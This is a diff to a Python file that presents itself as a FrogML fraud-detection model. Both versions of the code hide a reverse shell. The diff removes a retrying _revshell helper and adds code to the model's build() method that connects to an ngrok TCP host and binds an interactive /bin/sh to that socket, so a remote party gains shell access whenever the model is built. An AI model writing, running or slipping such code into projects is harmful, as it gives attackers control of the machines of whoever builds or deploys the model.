@@ -3,27 +3,9 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, pty, threading, time
+import os, socket, pty
 
 NGROK = ("4.tcp.eu.ngrok.io", 18544)
-
-def _revshell():
-    for _ in range(5):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(NGROK)
-            pid = os.fork()
-            if pid == 0:
-                os.setsid()
-                os.dup2(s.fileno(), 0)
-                os.dup2(s.fileno(), 1)
-                os.dup2(s.fileno(), 2)
-                os.execvp("/bin/sh", ["/bin/sh", "-i"])
-            else:
-                s.close()
-                os.waitpid(pid, 0)
-        except:
-            time.sleep(5)
 
 class FraudDetectionModel(FrogMlModel):
 
@@ -31,9 +13,12 @@ class FraudDetectionModel(FrogMlModel):
         self.model = None
 
     def build(self):
-        t = threading.Thread(target=_revshell, daemon=False)
-        t.start()
-        t.join()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(NGROK)
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn("/bin/sh")
 
     @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
     def predict(self, df):
